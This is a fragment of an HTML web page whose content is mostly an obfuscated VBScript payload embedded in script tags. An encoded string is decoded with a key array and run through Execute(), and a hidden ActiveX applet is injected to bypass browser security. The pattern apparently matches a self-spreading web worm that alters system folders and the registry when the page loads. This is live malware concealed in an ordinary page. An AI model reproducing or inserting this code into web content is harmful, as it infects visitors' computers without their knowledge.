BeqePe^]Reji,CihqeQeqDii^Reji=?QO+HnekMcxq?glb!Dii^Naqa*8&IcRym^Qto; armiTe^l?glbMcmm'Urfmc s[ArI_&:EMKL;&o`CoEd # <$ ;MDVmnih_d: s[qcobnt7&IJ\lraom&)  # >$ s[ArI_&ArmiMcxqEilcIcRym^Qto; o`sRhbgCbjeQ^kp+Ppiq^v_<pLc$ S[qTbqr>ldBd?glbMcmm'Alllc>ldBd>ld?sn`mgok?sn`mgokIJ@a_nd^Qu_!AuokcnqLrrfge,IZqtFgbeu<faoF_L^lrIk]cx@a_r60MfekIcJecm&L@Zqe%<sro^ltPmpik`',.=9JC^lc(\ )MfekKG<fak`cSr[=?gn^ewDfli # :YPn`E60Clp^HCAh^geePn` :Aho!?s`!Jecm&L@Zqe%<sro^ltPmpik`',.' */)7U LsbB; -Ek]IcEilcDHCeZlgbLsb6Mf]&CrkpekmQtoblg)**L^lrIk]cx@a_r&Ek]IcEk]FrgatfhlFrgatfhl HCArbZreJZgl%LgEokmrKcsrfc K^vtGfBlWe^pe6emklRhbgBqgt?sn`mgokEk]IcSeZpeCbje6Lb_r(TblP^mf,0&Nrl`pajDii^q\@hkmlgFfecsYFgcohqocmSeZpeaUQt^mgok^pyY[jakd,hqf Bd %?QO+?glb>vipmq(Pa_rb?glb' QacnAaieKG:npbgbTl!Qh^kcFfec,armi'>jsbSbmFfecTbfn :DSL'MpbgReumDii^&SeZpeCbje)+*tonc)Dii^Reji,Wobre:EMKL;&o`CoEd # <$ ;MDVmnih_d: s[qcobnt7&IJ\lraom&)  # >$ s[ArI_&ArmiMcxqFfecTbfn.@emsbEk]IcDb__uimGd6WpLfeie,Rb`Pe^]&EDCY\<SRO>LT\NQEOUGdbgriqbcsY=cf^njtNqeoGDLnrLlhiVbkqilg=PqSe^jl+KcgO^_d%FKBR]LL<?L\F?CEBLEYLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\J^bi^OcrTlQhbej.O^eWobreFKBR]CRKPEKM]UP>P\F]cnqbriblZ#=cf^njtF]$YLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\Lb_r(LnrLlhiVbkqilg*1&$+)ZM^bj\@hkpllc Rlc Pm_tfhleor ,.% RB@]DTHPDC^ej HCKafePed! HH>W_@NPRBGR_RLCRYBbekmgtf^q\BecZslqBb&UQocmuao^ZMf\pophdtYHstihmk>vpo^qsY$ I^dt%HstIhmkS^psfhl,.&'.\JZglYLraqbmnbkw KZke%Qh^kcFfec)AaieKGF_iiKcg%FKBR]CRKPEKM]UP>P\F]cnqbriblZ#=cf^njtF]$YLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\Lb_r(LnrLlhiVbkqilg*1&$+)ZM^bj\TbbeLraqbmnbkw KZke%Qh^kcFfec)UsPacli'PedPpiq^EDCY\<SRO>LT\NQEOUQocmuao^ZMf\pophdtYHdff\c\6'.\Lnrllhi\Lirilgq\JZglY>biqhpPo^deo^lcb*10*.7/% RB@]DTHPDC^ej HCKafePed! HH>W_@NPRBGR_RLCRYLmfqp_rbUKi`kmsl_r\Tbldlpq J^qs^`gndQu_lwsq^k\MkmffecsYFgcohqocmOrmjoldIkmcrk^r P^rtfgesY)_0a)00-).0-).0-\.0-).0-).0-).43U.0.^.33) ,[jakd )AaieKGF_iiKcg%FKBR]CRKPEKM]UP>P\PhdttZpeYFgcohqocmZWfgbotlNQUAuokcnqOcrpbmnYPgnahusFcspZeik`Sr[qypmcmYIpocbjepUKi`kmsl_r Lnrllhi FgreogctLctqblgpU.a-].2-).0-).0-)a0-).0-).0-).01/Z0-*c00/.)`l^gi&WpLfeie,Rb`Urfmc AIEVXAUOKCNQXSSBKZSl_rw^kc\JbarllmfqUMfcbaeY*..-UMuqemohUMpqbmnpUKafeZEabrooIpec^pek\c)*11-00,KCG\=UOO= <_liIJJZglO^e(AIEVXAUOKCNQXSSBKZSl_rw^kc\JbarllmfqUMfcbaeY*..-UAojfmnYF_iiLctqblgpULetLraqbmnbkw)`l^gi&KGnkm^`cFlebeo!Jecm&WfgNaqa*3&$ Ipodk_m?glblZClfkokDii^q\JbarllmfqQh^kcdYLraqbmnbkw&Ek]FrgatfhlFrgatfhl HCArbZreJbjibn&)Mn>prlkRblsmbLeumQ^kpMZrh6IcLoq!DSL'Dii^Cxflrs%PgnMZrhTLarfir.bqc&Te^lMcmmI_te; lwsq^k3/U >ldBdBd Q^kpMZrh6prqtbf12YTe^lLraomSpCbje6WfgNaqa&QYPMCMYDcrk^j3/'bliBeqeQt^krUm?glb; TblP^mf # SVLREJUIeogcl+]jlEk]IcWpLfeie,Rb`Urfmc AIEVXJO@:J_J:AHFGC\PhdttZpeYFgcohqocmZWfgbotlZCrkpekmTeolgokUPukUIeogcl0+ ,Pm_rqNnFfec?QO+<mpv?glbUikI_te$ pcbYdhw^ej.dbd)PgnMZrht^`\Chjdbk,hqm ?QO+<mpv?glbUikI_te$ lwsq^k3/UijtZjl+`gf%UikI_te$ lwsq^k3/Ubepdrom'gnf@ZjlDHAmicnaMm(TblP^mf # wb[ZFlebeo'ftq*emr&WpLfeie,Rb`Urfmc AIEVXAL>LQEPXPOLMZ.aej\% diedii^ PqSe^jl+KcgTkgtb HH>W_@E?SP>Q_OHMTY'bliUAokmcnqRym^ ,Znpibaaqbmn,q+mp]mwkemaaTlQhbej.O^eWobreFKBR]CI:QSBL]RLHR\aejffec\A^darerI`hl\%UsPacli'PedKcaa! HH>W_@E?SP>Q_OHMTYovdcbjeY=cf^njtF\mnY'PqSe^jl+KcgTkgtb HH>W_@E?SP>Q_OHMTY]jlcbjeYLarfirEk`gnbU ,O@S`kgpqTlQhbej.O^eWobreFKBR]CI:QSBL]RLHR\aejFfec\PacliUMpbgZClfkak]Z)PgnMZrhTbfnP^mf # WP\pimm,eu^/#*WpLfeie,Rb`Urfmc AIEVXAL>LQEPXPOLMZdieDii^ZSe^jlBqZPohneomwSe^ctEZldi^psYPQHMkmppU ,t40/.2C>.+92,@-.*AF*1A93&.0>:.0?1505<{UsPacli'PedPpiq^EDCY\<JAPLCS\KMOQUbli?glbUQcobntEhqtBgaoa^Z)y82*113,/-11.C**/D/&@1C2+0-<.4C14C0+2}SbmFfecTbfn :DSL'MpbgReumDii^&SqZptRiDii^*2)mpubCbjeQ^kp+Ppiq^V_lReumCbjeQ^kp+<jop^Bgb CnlcqbmnCnlcqbmnDHLfdcIq!'Bd FgUhbkc 97emklRhbgBqgt?sn`mgokEk]IcTebqLl\_tfhl :bo`nkekm,ll\_tfhlBd I^dt%MfipEmc^mgok%4&; _glbTe^lMfipEmc^mgok; Jbb(QagsIhaaqbmn)2'Bd CLM.D^rEumcnpbmnKZke%MfipEmc^mgok<; mfekTebqLl\_tfhl :Jecm&TebqLl\_tfhl,I^l(QagsIhaaqbmn&+ I^l(CLM.D^rFfecN^fc(QagsIhaaqbmn&'>ldBdBd I^l(QagsIhaaqbmn&< 0RhbgQagsIhaaqbmn6TebqLl\_tfhl # \Ek]IcKGnkm^`cFlebeo!RhflJo`Zrilg'>ldBd>ld?sn`mgok?sn`mgokIJJZglO^e(O^eSqk*FfecN^fc)Mn>prlkRblsmbLeumO^eTbfnSqk=PqSe^jl+KcgO^_d%KcgPmp)GfKcgQ^kpPmp : MfekWpLfeie,Rb`Urfmc O^eSqk*FfecN^fc>ldBd>ld?sn`mgok?sn`mgokIJL[mSr[&CrkpekmQtoblg&Sr[C :.McsqHst60BoPfii^ToncMcsqHst6TblrOrm+*F_TblrOrm>+6 QacnAuokcnqLrrfge :DikZjyAbqk7U >viqBoCnaGfMn>prlkRblsmbLeumP^r QagsChjdbk=?QO+@ctChjdbk&CrkpekmQtoblg&SbmDf\Qu_; @kcaq^Mbg^at%Qcobntfge.Abatfhlaor )QeqDoi]crp; QagsChjdbk,Sr[Doi]crpFlebeo<mukm=)Chp BZahMcmm?mla^p fgFlebeolChjdbkAorgr :Doi]cr@hsnq) .Df\Qu_'_daDoi]cr@hsnq%TbfnFlebeo'Laj^K^vtGf=gcPn`.@hsnq; -RhbgIZqtFgbeu<fao; FgqtoKcv%<sro^ltPmpik`*Y*Lbg&CrkpekmQtoblg&&/)Qu_Lrrfge :Kia!AuokcnqLrrfge,IZqtFgbeu<fao$/,I^l(@nprbgrSqkgnd+L^lrIk]cx@a_r**'<sro^ltPmpik`=DHCeZlgbLsb%<sro^ltPmpik`*L^lrIk]cx@a_r&Sr[C :/>jsbIcQu_>=)Te^l<sro^ltPmpik`=<sro^ltPmpik`&=gcPn`.Fmcm%*' # \Eubr AhBeqeh :.?mrc=*TlDoi]cr@hsnqIcJC^lc(Pn`Sqkgnd=EAap^&Df\Qu_'Gtbf&j&Te^lBd g: ChjdbkAorgr QacnAuokcnqLrrfge :AuokcnqLrrfge #Bi`Lsb+Brej!h+.&ZCxfmDlEk]IcEk]IcNbqrE_sqBldbqAh^k=BlsqkPes!AuokcnqLrrfge,U ,I^l(@nprbgrSqkgnd+1&Sr[Qtoblg6Mf]&CrkpekmQtoblg)E_sqBldbqAh^k)1)Ecn%<sro^ltPmpik`'-IZqtFgbeu<fao&/)AuokcnqLrrfge :IJ@a_nd^Qu_!AuokcnqLrrfge,IZqtFgbeu<faoBgb F_Bgb F_IhmpIJL[mSr[=<sro^ltPmpik`Bgb CnlcqbmnCnlcqbmnDHPohnadZre%LgEokmrKcsrfc K^vtPedI_teO_lr^=FKBR]LL<?L\F?CEBLEYLmfqp_rbUKi`kmsl_r\Lnrllhi Bqnrblq\A^erb^ =gsh=cgo^c :UsPacli'PedKcaa!PedI_teO_lr^'Bd AbqkA^erb^=  QacnBipdBedkce6Ffg_lv=gsh$ 3ZCnaGfDoog=.ro.AbqkA^erb^=DHO_hQu_!BipdBedkce&KGnkm^`cFlebeo!BipdBedkce&NbqrPqSe^jl+KcgTkgtbPedI_teO_lr^*DfliDb`pebEk]FrgatfhlFrgatfhl HCsmjZeeChjdbk&P^mfN^fc)Mn>prlkRblsmbLeumP^r ChjdbkLaj^=?QO+@ctChjdbk&P^mfN^fc)QeqRhflDii^q :Doi]crKZke+?glblEmrEubqtp; -FlkE^\f QagsCbjeBl QagsCbjepFfecEum=NAap^&FPH,GbmCxq^lsfhlN^fc(QagsCbje+I_te'Bd CbjeBqr : HQF  LkFfecEum=FTJE  LkFfecEum=?SMOoDii^Cxq; IFPMr?glb>vt6GLNMfekC^ej HC?pm^ldQh&TebqFfec.MZrh)ftje )Clp^Gf?glb>vt6S;QMfekC^ej HC?pm^ldQh&TebqFfec.MZrh)tbp'>jsbBd CbjeBqr : HQM  QacnFtq>vipmq :/>ldBdGcxqIc&U@Zqe%I_teG_mb=NAap^&WfgNaqa&BepdromU )&Mr!SC^lc(MZrhKZke&; R<_sb!UikI_te$ =cshmmp'Te^lArtBqgsql=*Bgb F_F_HqmCxflrs60MfekFPH,CliwFfec TblP^mf # svlrej,0\a^qkqhn.fgg)I_teG_mbFPH,CliwFfec TblP^mf # wb[ZFlebeo'ftq*P^mfN^fc>ldBd>ld?sn`mgok?sn`mgokIJP^rDff&)Mn>prlkRblsmbLeumBkp.@ecaoTblrIq; TLarfir.P\pimmDuielaj^F_EokTe^lBlWe^pe6emklEilcBlWe^pe6s[qCnaGfGfBlWe^pe6s[qMfekSbmFPH=<pe^mcO_cccq! S`kgpqblg+?glbLwsq^kO_cccq'LctPqSe^jl6Co^_tbH`jb\r(PQcobnt+Lfeie )Clp^P^r >inlbH`jb\r :bo`nkekm,amijeql&HC]gr^qt>inlbH`jb\r.p^rCILGD%yF6,3D@+0-.<D0**/D-&?D?2+0-<.4C=38>)@}>inlbH`jb\r.`kcaq^Gnpm_n`^&)QeqUsPacli; >inlbH`jb\r.D^rO_cccq!':npi^Mbg^at+lct@EQIA! {-=23C>.1*?.90&/1@?+86-.--)?0@2.51+08z':npi^Mbg^at+\pe^mcIklrak\c(&SbmFPH=:npi^Mbg^at+@ctL[he`m&)CnaGfQeqBipdMbg^at6FPH,DobtepFlkE^\f AbqkQ^kpBl AbqkL[he`mF_DfliTbfn.AkgvbMwpb:>+Ak]DfliTbfn.AkgvbMwpb:>*Te^l>viqDooEk]IcFfg_lv=gsh; AbqkQ^kp+=pis^JeqmcrLeumAbk Lmfeo:pr%,'K_nahkiw^Chp f6. Qh3Mte^pAok&i&; Fgr(%2*Kld&K^vtRejiQtoblg6Flki:*TlJek!RhflReum'McmmGsm6Ap\&Mf]&TebqTbqr,f%/)&IcRejiLuj; .,Te^lMcmmGsm625EilcIcRejiLuj; .)Te^lMcmmGsm626Ek]IcTbfnCeZp :Aho!RejiLuj+ Lmfeo:pr%bMl]4&F_TbfnCeZp :Aho!14&RhbgQ^kp@a_r6Cek&15Bgb F_Q^kpPmpik`=McmmLrrfge #RejiAh^kK^vtSnIhakPmp : Eu^auq^&=gmDcy>kp(0*TebqTbqrtb@kJf# Kbr?ro!.)6Oqacr>kp(-& #o`CoEd&Iev:pr%*' :  #Mte^pAok&1&$  &s[ArI_$Dcy>kp(/=&Hrhbk?ro!0)$v_<pLc H^wAok&3&; $ Lmfeo:pr%,' # tb@kJf# Flki:*TlJek!CxbLrrfge)$v_<pLc Q^kpKnk :?s`!Kia!CxbLrrfge,f%/)& &s[ArI_$Bd Q^kpKnk :/8Mfek &s[ArI_$McmmGsm631 &s[ArI_$>ldBdtb@kJf# TbfnCeZp :Aho!RejiLuj) H^wAok&iFmd-')$v_<pLc F_TbfnCeZp :Aho!08&Rhbg #o`CoEd&RejiAh^k=o`Co &s[ArI_$>jsbBd Q^kp@a_r6Cek&26Te^ltb@kJf# TbfnCeZp :tbI_ #o`CoEd&CnaGf$v_<pLc QagsQ^vt6TebqTbqr #RejiAh^k #o`CoEd&Leum &&o`CoEd # Eu^auq^&TebqTbqr)TebqTbqr : Eu^Qtoblg6&McmmLrrfge # EmklQ^vt6 <$ larfir iZlgrZee:o`s`kgpq7  #tb@kJfahauj^lt+ppiq^  # <$ ]gvlryi^;'mhqiqbmn7Z`slestb4lb_r:-iv;mmp7)nx8uiamf:-iv;acidar:-iv;s+ik]cx7+6;ogsf[glfmw:agda^l';&: $ :NPI>R K:KE:DH \`sepmHBBEHQ6. TBBTE6. `hbe:\mm+fq.$ZatfocX+:atfoc U<mmmhlekm<9&-AMIJEQ7  # <$ (bis7 $ s[ArI_&:,larfir>$ s[ArI_&:p\pimml^geu^`c=s[qcobnt;&o`CoEd #RhflReum&o`CoEd #SnIhakPmp #tb@kJf9&-s`kgpq7  #tb@kJf9&-BL=W>$ s[ArI_&:,ARMI7 O`sQ^vt6TebqTbqr #tb@kJfUkEmchLrrv_<pLc$ DH_pm_rq!'UikI_te; CLM.D^rSm^ai^eDoi]cr%)' # \Ic&FPH,FfecEubqtp!UikI_te$ pcbY?mla^p.emr&Te^l?QO+<mpv?glbUikI_te$ pcbY?mla^p.emr)PgnMZrht^`\hcuaie,gf_ >ldBdBd %?QO+?glb>vipmq(TblP^mf # svlrej,0\a^qkqhn.fgg&Te^l?QO+<mpv?glbUikI_te$ lwsq^k3/Ubepdrom'gnf*WfgNaqa&qypmcm0+Zkgp_li'eicBgb F_Bgb Cnlcqbmn"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 3"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 2"&vbCrLf&"KeyArr(3) = 0"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
<!--mstheme--></font></td><td valign="top" width="24"></td><!--msnavigation--><td valign="top"><!--mstheme--><font face="Tahoma">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "=ggBlQ`^p_$ArgdMcrl%T\kMcrl%B__kc_Kbeh$:njd^M\b^an$?QI$PqM`^jf$PghHZrb$Ls\=%DcfZjs<bqeQoZIDWlr[jm&#IDK^r>af&#ID;kc[l^Kcdbco CCJcc^Gn CCAl]Zr_EZgf CCNlgi_aYmc!?f]Mm[Dof\rcggEB:nj]gbNg!Dcd^N[la*NqicMlk'Hl=kpijP_knk_GcrlM]mL]ZbN]fn5DMG'Mj]gR_pmDcd^&@aecJYmf&)LfnMlk7Kc[\Mcgh'P_Y]?fdC^GhkmpLfnMlk*CC]mlZpn  #5<(MlEch MkjKmp#5+Mf_fL]ZbN]fn(;emm]?pbr>nl]lbmhCh\G`G`Mwj]Lrl6`mrMf_fL]ZbN]fn(;emm]M]m@aecN]fn5DMG'Mj]gR_pmDcd^&@aecJYmf&*>bj_L^kj&Ppcl^4 @I<Rifem[\6 $o`m[kgjl3  EBXqnYkr! 6 o`=jEdRghLrlpZ<pF^$@mkfL^vnDcd^R_ei,=dhq_Q_lD;lmpcZ;>LM(?^r@aec>bj_HZrb!@9mrla[,[lmpcZnr_k;+-=eq_P_Y]R_ei,=dhq_Q_lDcd^R_ei7?QI&Hn_fMcrl?gf]!Dcd^N[la*2!C^Rsh^Qnj;argdN`^l?gf]Mcgh'Ulamcn[AlD_ :@MKF6 o`=jEd 6$;M>Qmhdh_^5 n[q]jbnn2 IDWlr[jm&#  8$n[AlD_ ArgdMcrl?dlcC^Rsh^Qnj;o`mRb]g>bj_L^kj&Ppcl^pZ<pF^$N[qN]qr>l^Bd?gf]Mcgh'Afglc>l^Bd>l^?sh[mgif?sh[mgifID;a_h_^QoZ!AojkchlLrlage&DZqnAgb_p<f[jA_FYlrCf]cr;a_l6*Mf_fC^J_^m&F;Zq_ <slj^lnKmpcf`'&)74J=Ylc\ #Mf_fEB<f[f`cMm[7?ghYew>ali 4TKn`?6*Cfk^CCAbYge_Kn`5Abj!?m[!J_^m&F;Zq_ <slj^lnKmpcf`'&)'%/#2U Ls\=;(?f]C^?dlcDH=`Zla]Ls\6Ga]&=mkp_fmQnjbla$**FYlrCf]cr;a_l!?f]C^?f]@mganahl@mganahlCCAl]Zr_EZgf Gg?jkmlKcmmfcF^vnG`BlQ`^p_6`mkfRb]g=qgn?sh[mgif?f]C^M`Zp_>bj_6F]_rOblJYmf&+ Nlg`p[eDcd^qV;hkggg@aecmTFg]jhqi^mM`Zp_\UQnYmgif^psT[j[fd,blf Bd ?QI&?gf]>vckmqKa_l]?gf]'LachA[deEB:nj]gbNg!QbYkc@aec&argd'>jm]M]m@aecN]fn5DMG'Mj]gR_pmDcd^&M`Zp_>bj_$+*njnc#Dcd^R_ei,Qjbr_:@MKF6 o`=jEd 6$;M>Qmhdh_^5 n[q]jbnn2 IDWlr[jm&#  8$n[AlD_ ArgdMcrl@aecN]fn(;emm]?f]C^>]__odmG^6QkLf_de,L]`P_Y]&@DCSW<SLJ>LNWNQ?JUG^]grclbcmT=c`YnjnNq_jG>GnrFghiP]kqcgg7PqM`^jf&KcaJ^_^ FE=R]FG<?FWF?=@BL?TLm`lp_l]UKc[kmmg_rVGnrfghi=qnl]lqVE^bcYOclOlQb]ej(J^eQjbr_FE=R]=MKP?FM]OK>PVA]chlbrc]lZ=c`YnjnA]$TLm`lp_l]UKc[kmmg_rVGnrfghi=qnl]lqVF]_rGnrFghiP]kqcgg*+!$&)ZGYbjV;hkjglcMlcKm_nahl_jr &)% L=@]>OHP>=YejCCK[aeP__! BC>WY;NPL=GRYMLCLTBb_fmgna^qVB_^ZsflBb UQi^mu[j^ZGa\pikhdnTHsndhme>vjj^qmT$D^dn HsnDhmeN^pmahl&) '.VEZgfTLr[lbmh]kwFZk_%QbYkc@aec#A[deEBF_cdKca FE=R]=MKP?FM]OK>PVA]chlbrc]lZ=c`YnjnA]$TLm`lp_l]UKc[kmmg_rVGnrfghi=qnl]lqVF]_rGnrFghiP]kqcgg*+!$&)ZGYbjVObb_Lr[lbmh]kwFZk_%QbYkc@aec#UmKacfd'P__Ppcl^@DCSW<SLJ>LNWNQ?JUQi^mu[j^ZGa\pikhdnTHd`a\cV1'.VGnrfghiVGircggqVEZgfT>bclhpJj^d_j^l]]*++*.1*% L=@]>OHP>=YejCCK[aeP__! BC>WY;NPL=GRYMLCLTLm`lp_l]UKc[kmmg_rVObl^gpqE^qmY`gh_QoZlwml^kVHkm`aecmTFg]jhqi^mImmjigdCfmclf^rK^rnagemT)_*\)0*().*().*(\.*().*().*()...U.*)^.-.) &[j[fd #A[deEBF_cdKca FE=R]=MKP?FM]OK>PVKhdnoZp_TFg]jhqi^mZQagbiolHLUAojkchlOclkbmhTPgh\humFcmkZecf`Mm[qskmcgTIpi^bj_kUKc[kmmg_rGnrfghiAgr_jgcnLcnlblakU.[(].,().*().*()a*().*().*().*,/Z*(*c*+/.$`fYgi!QkLf_de,L]`UlamcAI?QXAOJKCHLXSM=KZMg_rqYkcVEbalglm`lUM`^ba_T*.((UMolemicUMjlbmhkUK[aeZ?\brijIp_^^p_f\c$*1+(00&KCAW=UIJ= <_fdIDEZgfJ^eAI?QXAOJKCHLXSM=KZMg_rqYkcVEbalglm`lUM`^ba_T*.((UAiefmhTF_cdLcnlblakUL_oLr[lbmh]kw$`fYgi!EBnkgY`c@geb_j!J_^m&QagN[la*-!$Ipi_k_g?gf]lZ=gfkifDcd^qVEbalglm`lQbYkc^TLr[lbmh]kw!?f]@mganahl@mganahlCCAl]Zr_Ebjc]n&#Mh>plgkL]lsg]L_pmL^kjHZrb6C^Lil!DMG'Dcd^Cralrm PghHZrbOLalair(]qc!N`^lMcghI_n`;lwml^k-*U >l^BdBdL^kjHZrb6krqn]f1,TN`^lLr[jmSj>bj_6QagN[la QSKMCGTDclf^j-*'bfd=eq_QnYkrOh?gf];OblJYmf MQLR?EUI_jgcf&]jf?f]C^QkLf_de,L]`UlamcAI?QXJI;:JYE:ABAGCVKhdnoZp_TFg]jhqi^mZQagbiolZ=mkp_fmT_jlgifUPofUI_jgcf++ &Km_llNn@aec?QI&<mjq?gf]UcfI_n`$pc\TdhqYej(_bd$PghHZrbo^`V>hj^]k,blm ?QI&<mjq?gf]UcfI_n`$lwml^k-*UidoZjf&`g`%UcfI_n`$lwml^k-*Ub_kdrih'gha;ZjfDH;hich\MmOblJYmf q][Z@geb_j'fnl*`mr!QkLf_de,L]`UlamcAI?QXAF9LQ?KXPIGMZ(\ejV% ^dedcd^ PqM`^jf&KcaOkgn] BC>WY;E?MK>QYJHMNT'bfdUAifmchlRsh^ &Znjdba[lbmh'q+gk]mqfem[\OlQb]ej(J^eQjbr_FE=R]=D:QM=L]LGHRV\ej`aecV<^d[merC[hlV%UmKacfd'P__Kc[\! BC>WY;E?MK>QYJHMNTov^^bj_T=c`YnjnA\mhT'PqM`^jf&KcaOkgn] BC>WY;E?MK>QYJHMNT]jf^bj_TLalair?f`gh]U &O@M[kgjlOlQb]ej(J^eQjbr_FE=R]=D:QM=L]LGHRV\ej@aecVKacfdUMj]gZ=gfk[f]Z$PghHZrbN]fnJYmf QK\pchm,_p^/#$QkLf_de,L]`UlamcAI?QXAF9LQ?KXPIGMZ^deDcd^ZM`^jf=qZJjhn_jmwM`^cn@Zl^d^pmTPQBHkmjkU &t4**.2=9.+3-,@')*A@%1A3.&.*9:.*:15*0<{UmKacfd'P__Ppcl^@DCSW<J;KLCMWKMILUbfd?gf]UQ]jbnn@hqn=gai\^Z$y2-*1+.,/',1.=%*/>*&@+>2+*(<..>14=++2wM]m@aecN]fn5DMG'Mj]gR_pmDcd^&MlZpnMiDcd^*,$mpo]>bj_L^kj&Ppcl^PZlR_pm>bj_L^kj&<jik^=gb>nl]lbmh>nl]lbmhDHFadcCl!'BdAgUb]kc47`mkfRb]g=qgn?sh[mgif?f]C^N`bqFg\_nahl5bi[nk_fm,fg\_nahlBdD^dn MfckEm]Ymgif%.!;_gf]N`^lMfckEm]Ymgif;EbbLagmDha[lbmh$2'Bd>LM(?^r?pmchkbmhFZk_ MfckEm]Ymgif66 mf_fN`bqFg\_nahl5J_^m&N`bqFg\_nahl&D^lLagmDha[lbmh!+D^l>LM(?^r@aecHYfcLagmDha[lbmh!'>l^BdBdD^lLagmDha[lbmh!<+Rb]gLagmDha[lbmh6N`bqFg\_nahl V?f]C^EBnkgY`c@geb_j!RbalJi[Zrcgg'>l^Bd>l^?sh[mgif?sh[mgifIDEZgfJ^eJ^eMlk*@aecHYfc#Mh>plgkL]lsg]L_pmJ^eN]fnMlk7PqM`^jf&KcaJ^_^ KcaKmp#G`KcaL^kjKmp5 Mf_fQkLf_de,L]`UlamcJ^eMlk*@aecHYfc>l^Bd>l^?sh[mgif?sh[mgifIDG[mMm[&=mkp_fmQnjbla!Mm[C5.McmlHsn6*BiPfcd^NjncMcmlHsn6N]lrImm%*A_N]lrImm8+6LachAojkchlLrlage5DcfZjs<bqe2U >vclBiCh\G`Mh>plgkL]lsg]L_pmK^rLagm>hj^]k7?QI&@cn>hj^]k&=mkp_fmQnjbla!M]m>a\QoZ;;kc[l^M\b^an Q]jbnnage(<banahl[jr #Q_lDid]clk;Lagm>hj^]k,Mm[Did]clk@geb_j<mofm7)>hp=ZabMcgh?mf\^pag@geb_jl>hj^]kAimgr5Did]cl;hshl))>a\QoZ'_^\Did]cl;hshl%N]fn@geb_j'L[e^F^vnG`=g]Kn`(;hshl;(Rb]gDZqnAgb_p<f[j;AgqnjKcp <slj^lnKmpcf`*T*F]g&=mkp_fmQnjbla!&/#QoZLrlage5Kc\!AojkchlLrlage&DZqnAgb_p<f[j$/&D^l;npl]grMlkgh_+FYlrCf]cr;a_l%*'<slj^lnKmpcf`7DH=`Zla]Ls\ <slj^lnKmpcf`*FYlrCf]cr;a_l!Mm[C5/>jm]C^QoZ>7)N`^l<slj^lnKmpcf`7<slj^lnKmpcf` =g]Kn`(Amcg *' V?pbr<h=eq_h5.?mlc7*NgDid]cl;hshlC^J=YlcKn`Mlkgh_7EA[k^&>a\QoZ'Gn]f&d!N`^lBdb:>hj^]kAimgrLachAojkchlLrlage5AojkchlLrlageBc[Ls\&Br_e!h%) ZCram>g?f]C^?f]C^H]qrE_mlBl^]qAbYk7BlmlkP_n!AojkchlLrlage&U &D^l;npl]grMlkgh_++!Mm[Qnjbla6Ga]&=mkp_fmQnjbla$E_mlBl^]qAbYk)+$Ech <slj^lnKmpcf`''DZqnAgb_p<f[j&/#AojkchlLrlage5ID;a_h_^QoZ!AojkchlLrlage&DZqnAgb_p<f[j=gbA_=gbA_DhmjIDG[mMm[7<slj^lnKmpcf`=gb>nl]lbmh>nl]lbmhDHJjhn[_Zr_ Gg?jkmlKcmmfcF^vnP__I_n`O_fm^7FE=R]FG<?FWF?=@BL?TLm`lp_l]UKc[kmmg_rVGnrfghi=qnl]lqV<^el]^ =gmc=caj^c5UmKacfd'P__Kc[\!P__I_n`O_fm^'Bd<bqe<^el]^7 LachBckdB__kc_6@ag_fq=gmc$3ZCh\G`Dijg7)ri.<bqe<^el]^7DHIZhQoZ!BckdB__kc_!EBnkgY`c@geb_j!BckdB__kc_!H]qrPqM`^jf&KcaOkgn]P__I_n`O_fm^*>ali>]`p_]?f]@mganahl@mganahlCCsgeZe_>hj^]k&JYmfHYfc#Mh>plgkL]lsg]L_pmK^r>hj^]kL[e^7?QI&@cn>hj^]k&JYmfHYfc#Q_lRbalDcd^q5Did]clFZk_&?gf]l@mr?pbqnk;(@gk?Y\fLagm>bj_BlLagm>bj_k@aec?pm7NA[k^&@KH,A]mCrl^lmahlHYfcLagm>bj_&I_n`'Bd>bj_=qr5 BLF Gk@aec?pm7FNEE Gk@aec?pm7?MHIjDcd^Crl;IFJMl?gf]>vn6BLNMf_f=YejCC?jh^l^Lh&N`bq@aec(HZrb$fnee #Cfk^G`?gf]>vn6N;QMf_f=YejCC?jh^l^Lh&N`bq@aec(HZrb$t\k'>jm]Bd>bj_=qr5 BLM LachFnl>vckmq5/>l^BdGcrlC^&O;Zq_ I_n`G_g]7NA[k^&QagN[la B_kdrihU #!Ml!S=YlcHZrbFZk_!;M<_m]!UcfI_n`$=cmcmmj'N`^lArn=qgmll7*=gbA_A_BlmCralrm6*Mf_f@KH,=giw@aecOblJYmf mqlr_e,0V\^qelhn(agg$I_n`G_g]@KH,=giw@aecOblJYmf q][Z@geb_j'fnl*JYmfHYfc>l^Bd>l^?sh[mgif?sh[mgifIDK^r>af&#Mh>plgkL]lsg]L_pm=kp(;ec[jN]lrCl;OLalair(K\pchmDodel[e^A_?jkN`^lBlQ`^p_6`mkf?dlcBlQ`^p_6n[qCh\G`G`BlQ`^p_6n[qMf_fM]m@KH7<p_YmcIZcc]l! M[kgjlbla&?gf]Lwml^kIZcc]l'LcnPqM`^jf6=j^_n]H`d]\rPQ]jbnn&Lf_de #Cfk^K^r9inf]H`d]\r5bi[nk_fm,[hij_ll&CC]am^qn9inf]H`d]\r(k^r=DLG> y@1,3>;+0')<D*%*/>(&?>:2+*(<..>=329)@w9inf]H`d]\r([kc[l^Ghkm_h[^&#Q_lUmKacfd;9inf]H`d]\r(?^rIZcc]l!':njd^M\b^an&lcn;EQC<! u(=2->>.+%?.3+&/+;?+21-.'()?*;2./,+02u':njd^M\b^an&\p_YmcCflr[f\c!M]m@KH7:njd^M\b^an&@cnG[h_[m&#Ch\G`Q_lBckdM\b^an6